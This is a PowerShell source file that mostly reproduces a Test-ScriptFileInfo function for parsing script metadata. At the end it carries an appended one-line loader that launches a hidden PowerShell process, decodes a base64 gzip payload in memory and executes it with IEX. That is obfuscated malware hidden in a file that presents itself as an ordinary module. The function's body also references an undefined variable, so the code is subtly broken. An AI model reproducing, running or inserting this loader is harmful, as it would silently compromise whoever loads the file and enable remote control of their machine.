function Test-ScriptFileInfo {
    
    [CmdletBinding(PositionalBinding = $false,
        DefaultParameterSetName = 'PathParameterSet',
        HelpUri = 'https://go.microsoft.com/fwlink/?LinkId=619791')]
    Param
    (
        [Parameter(Mandatory = $true,
            Position = 0,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'PathParameterSet')]
        [ValidateNotNullOrEmpty()]
        [string]
        $Path,

        [Parameter(Mandatory = $true,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'LiteralPathParameterSet')]
        [Alias('PSPath')]
        [ValidateNotNullOrEmpty()]
        [string]
        $LiteralPath
    )

    Process {
        $scriptFilePath = $null
        if ($Path) {
            $scriptFilePath = Resolve-PathHelper -Path $Path -CallerPSCmdlet $PSCmdlet | Microsoft.PowerShell.Utility\Select-Object -First 1 -ErrorAction Ignore

            if (-not $scriptFilePath -or -not (Microsoft.PowerShell.Management\Test-Path -Path $scriptFilePath -PathType Leaf)) {
                $errorMessage = ($LocalizedData.PathNotFound -f $Path)
                ThrowError  -ExceptionName "System.ArgumentException" `
                    -ExceptionMessage $errorMessage `
                    -ErrorId "PathNotFound" `
                    -CallerPSCmdlet $PSCmdlet `
                    -ExceptionObject $Path `
                    -ErrorCategory InvalidArgument
                return
            }
        }
        else {
            $scriptFilePath = Resolve-PathHelper -Path $LiteralPath -IsLiteralPath -CallerPSCmdlet $PSCmdlet | Microsoft.PowerShell.Utility\Select-Object -First 1 -ErrorAction Ignore

            if (-not $scriptFilePath -or -not (Microsoft.PowerShell.Management\Test-Path -LiteralPath $scriptFilePath -PathType Leaf)) {
                $errorMessage = ($LocalizedData.PathNotFound -f $LiteralPath)
                ThrowError  -ExceptionName "System.ArgumentException" `
                    -ExceptionMessage $errorMessage `
                    -ErrorId "PathNotFound" `
                    -CallerPSCmdlet $PSCmdlet `
                    -ExceptionObject $LiteralPath `
                    -ErrorCategory InvalidArgument
                return
            }
        }

        if (-not $scriptFilePath.EndsWith('.ps1', [System.StringComparison]::OrdinalIgnoreCase)) {
            $errorMessage = ($LocalizedData.InvalidScriptFilePath -f $scriptFilePath)
            ThrowError  -ExceptionName "System.ArgumentException" `
                -ExceptionMessage $errorMessage `
                -ErrorId "InvalidScriptFilePath" `
                -CallerPSCmdlet $PSCmdlet `
                -ExceptionObject $scriptFilePath `
                -ErrorCategory InvalidArgument
            return
        }

        $PSScriptInfo = New-PSScriptInfoObject -Path $scriptFilePath

        [System.Management.Automation.Language.Token[]]$tokens = $null;
        [System.Management.Automation.Language.ParseError[]]$errors = $null;
        $ast = [System.Management.Automation.Language.Parser]::ParseFile($scriptFilePath, ([ref]$tokens), ([ref]$errors))


        $notSupportedOnNanoErrorIds = @('WorkflowNotSupportedInPowerShellCore',
            'ConfigurationNotSupportedInPowerShellCore')
        $errorsAfterSkippingOneCoreErrors = $errors | Microsoft.PowerShell.Core\Where-Object { $notSupportedOnNanoErrorIds -notcontains $_.ErrorId }

        if ($errorsAfterSkippingOneCoreErrors) {
            $errorMessage = ($LocalizedData.ScriptParseError -f $scriptFilePath)
            ThrowError  -ExceptionName "System.ArgumentException" `
                -ExceptionMessage $errorMessage `
                -ErrorId "ScriptParseError" `
                -CallerPSCmdlet $PSCmdlet `
                -ExceptionObject $errorsAfterSkippingOneCoreErrors `
                -ErrorCategory InvalidArgument
            return
        }

        if ($ast) {
            
            
            
            
            if ($commentLines.Count -gt 2) {
                for ($i = 1; $i -lt ($commentLines.count - 1); $i++) {
                    $line = $commentLines[$i]

                    if (-not $line) {
                        continue
                    }

                    
                    
                    
                    if ($line.trim().StartsWith('.')) {
                        $parts = $line.trim() -split '[.\s+]', 3 | Microsoft.PowerShell.Core\Where-Object { $_ }

                        if ($KeyName -and $Value) {
                            if ($keyName -eq $script:ReleaseNotes) {
                                $Value = $Value.Trim() -split '__NEWLINE__'
                            }
                            elseif ($keyName -eq $script:DESCRIPTION) {
                                $Value = $Value -split '__NEWLINE__'
                                $Value = ($Value -join "`r`n").Trim()
                            }
                            else {
                                $Value = $Value -split '__NEWLINE__' | Microsoft.PowerShell.Core\Where-Object { $_ }

                                if ($Value -and $Value.GetType().ToString() -eq "System.String") {
                                    $Value = $Value.Trim()
                                }
                            }

                            ValidateAndAdd-PSScriptInfoEntry -PSScriptInfo $PSScriptInfo `
                                -PropertyName $KeyName `
                                -PropertyValue $Value `
                                -CallerPSCmdlet $PSCmdlet
                        }

                        $KeyName = $null
                        $Value = ""

                        if ($parts.GetType().ToString() -eq "System.String") {
                            $KeyName = $parts
                        }
                        else {
                            $KeyName = $parts[0];
                            $Value = $parts[1]
                        }
                    }
                    else {
                        if ($Value) {
                            
                            $Value += '__NEWLINE__'
                        }

                        $Value += $line
                    }
                }

                if ($KeyName -and $Value) {
                    if ($keyName -eq $script:ReleaseNotes) {
                        $Value = $Value.Trim() -split '__NEWLINE__'
                    }
                    elseif ($keyName -eq $script:DESCRIPTION) {
                        $Value = $Value -split '__NEWLINE__'
                        $Value = ($Value -join "`r`n").Trim()
                    }
                    else {
                        $Value = $Value -split '__NEWLINE__' | Microsoft.PowerShell.Core\Where-Object { $_ }

                        if ($Value -and $Value.GetType().ToString() -eq "System.String") {
                            $Value = $Value.Trim()
                        }
                    }

                    ValidateAndAdd-PSScriptInfoEntry -PSScriptInfo $PSScriptInfo `
                        -PropertyName $KeyName `
                        -PropertyValue $Value `
                        -CallerPSCmdlet $PSCmdlet

                    $KeyName = $null
                    $Value = ""
                }
            }

            $helpContent = $ast.GetHelpContent()
            if ($helpContent -and $helpContent.Description) {
                ValidateAndAdd-PSScriptInfoEntry -PSScriptInfo $PSScriptInfo `
                    -PropertyName $script:DESCRIPTION `
                    -PropertyValue $helpContent.Description.Trim() `
                    -CallerPSCmdlet $PSCmdlet

            }

            
            if ((Microsoft.PowerShell.Utility\Get-Member -InputObject $ast -Name 'ScriptRequirements') -and
                $ast.ScriptRequirements -and
                (Microsoft.PowerShell.Utility\Get-Member -InputObject $ast.ScriptRequirements -Name 'RequiredModules') -and
                $ast.ScriptRequirements.RequiredModules) {
                ValidateAndAdd-PSScriptInfoEntry -PSScriptInfo $PSScriptInfo `
                    -PropertyName $script:RequiredModules `
                    -PropertyValue $ast.ScriptRequirements.RequiredModules `
                    -CallerPSCmdlet $PSCmdlet
            }

            
            $allCommands = $ast.FindAll( { param($i) return ($i.GetType().Name -eq 'FunctionDefinitionAst') }, $true)

            if ($allCommands) {
                $allCommandNames = $allCommands | ForEach-Object { $_.Name } | Select-Object -Unique -ErrorAction Ignore
                ValidateAndAdd-PSScriptInfoEntry -PSScriptInfo $PSScriptInfo `
                    -PropertyName $script:DefinedCommands `
                    -PropertyValue $allCommandNames `
                    -CallerPSCmdlet $PSCmdlet

                $allFunctionNames = $allCommands | Where-Object { -not $_.IsWorkflow } | ForEach-Object { $_.Name } | Select-Object -Unique -ErrorAction Ignore
                ValidateAndAdd-PSScriptInfoEntry -PSScriptInfo $PSScriptInfo `
                    -PropertyName $script:DefinedFunctions `
                    -PropertyValue $allFunctionNames `
                    -CallerPSCmdlet $PSCmdlet


                $allWorkflowNames = $allCommands | Where-Object { $_.IsWorkflow } | ForEach-Object { $_.Name } | Select-Object -Unique -ErrorAction Ignore
                ValidateAndAdd-PSScriptInfoEntry -PSScriptInfo $PSScriptInfo `
                    -PropertyName $script:DefinedWorkflows `
                    -PropertyValue $allWorkflowNames `
                    -CallerPSCmdlet $PSCmdlet
            }
        }

        
        if (-not $PSScriptInfo.Version -or -not $PSScriptInfo.Guid -or -not $PSScriptInfo.Author -or -not $PSScriptInfo.Description) {
            $errorMessage = ($LocalizedData.MissingRequiredPSScriptInfoProperties -f $scriptFilePath)
            ThrowError  -ExceptionName "System.ArgumentException" `
                -ExceptionMessage $errorMessage `
                -ErrorId "MissingRequiredPSScriptInfoProperties" `
                -CallerPSCmdlet $PSCmdlet `
                -ExceptionObject $Path `
                -ErrorCategory InvalidArgument
            return
        }

        if ($PSScriptInfo.Version -match '-') {
            $result = ValidateAndGet-VersionPrereleaseStrings -Version $PSScriptInfo.Version  -CallerPSCmdlet $PSCmdlet
            if (-not $result) {
                
                
                return
            }
        }

        $PSScriptInfo = Get-OrderedPSScriptInfoObject -PSScriptInfo $PSScriptInfo

        return $PSScriptInfo
    }
}

if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAFHL6FcCA71W/2/aOhD/uZP2P0QTEolGCVDWdpUmPYfwJS2h0EAoMDS5iRMMJqaOoYW9/e/vAqFlb+3Utx9eBIrtO5/Pn/vcXYJl5EnKIwUPmMeugkvXVr6/f3fUxgLPFTWzua9addss5ZSMsGLRWbCbU+3oCDQytHsllS+KOkKLhcnnmEbji4vKUggSyd08XycSxTGZ3zFKYlVT/lb6EyLI8fXdlHhS+a5kvuXrjN9hlqqtK9ibEOUYRX4ia3IPJ97lnQWjUs1+/ZrVRsfFcb56v8QsVrPOOpZknvcZy2rKDy05sLteEDVrU0/wmAcy36fRSSnfi2IckBZYWxGbyAn346wGt4CfIHIpImV7n8TATqxmYdgW3EO+L0gM2nkrWvEZUTPRkrGc8pc6Sk+/WUaSzgnIJRF84RCxoh6J8w0c+YzckGCstsjD/tJv3aQebgKtthRaDiLygps295eM7HZmtV8dfYqiBs9PkQQIfrx/9/5dsKfBeiLPbwd9qyOdQx7A6Gi0HRNwV23zmG7VvyiFnGLDwVhysYZppiuWRBsroyQMo/EYDvO/OVbudQPFvTbozja1VbELiyOXU38Mm9IYZWb3l/TE7znxqZWIX6ecSQIaEXMd4Tn19qxSXwoACRjZXjq/V2uBd2o2FRDfJIyEWCaQ5pTRr9uqcyqf9hpLynwikAdBjMEriK/2szO7KKlZK7LJHNDazbMQjwC4TPbaKX/X+9OTOShlKwzHcU5pLyGZvJziEMyIn1NQFNNUhJaSb4fZZ3ftJZPUw7Hcmxtr/4IzPbbCo1iKpQdxBAi6zoJ4FLMEkZzSoD4x1g4N98dnX8SjghmjUQiWVhAPWElwcGTCDuHnUiZoeYdIa75gZA5K2+yuMRxCLqcZseUTDomffcXTPfF3LE+g2WNy4CfE22Fc5hSXCgm1IoF5x64/dOSgUBy6VBEkjZG6z6WRsZYJ9TO8ZCRcTYHawiIkQFITfG7gmJyWHSkAMPWDfk0rCJ6BFTHbM2a0iB5o0bLh36MnFjfP/KvLaUMX5uMkQFZs2Y222Wk0yqtLxy1Lp2rJq7Yl7ertdOqgxk1vIIcWanRpYTYobxaXdOM0kT941E83xuahYDxupqEfDMwgCM8C56b4qUab/UrHKJRw06wum33jwSiU4yp9aHRorzO7rMm7gctwL9DD2+JnTB+bYuoWub2xEKpPTrzNZeDWJ7a/HjT0z/3yDFURqkRVt2bwq4EhUFt3cejy/n1B6P2wggzPpmTY6dWMTqdmoF59em9+1kPYe4snRt8t0eHi9mYC8xq4cKUXypZPNnzQAZDqHOHwBnTCSsmbBKBjfkTGxxaPS3hmcGSATm14D34NFrU2A3m3V+LIZa1bjJrDdU3Xi4N2GTUKtF8PUWISh0YHo3hlbky96Prc739qDQLdvWVnulnpLrxA1/WHhnnlDYuP59dn580+decc9XTd/ZCwA+iRWcnhtbtptg5i/lqRt7GIJ5gBF6B67zOzxkUtLcNtTpMdqnrQlWdERIRBK4Nmt2c1Yox7SVc4LNvQmHbtYgxZ2oPhSenFkaY8KWrPTWO/dHExBJchWYDF+SaJQjnJFR5PCgUo+IXHcgFu/fZbVvhirSaWckm/eEIqtc621rUkdzJ+YXVfP/8/IEwzdwIv/40QPq/9RvomWAu5ZxB+Ef288J+A/kMs+phK0HegGDGya5O/hSQl0MGnxi5uwJAgfZKPveulPG7BN8g/6nlhxGUKAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

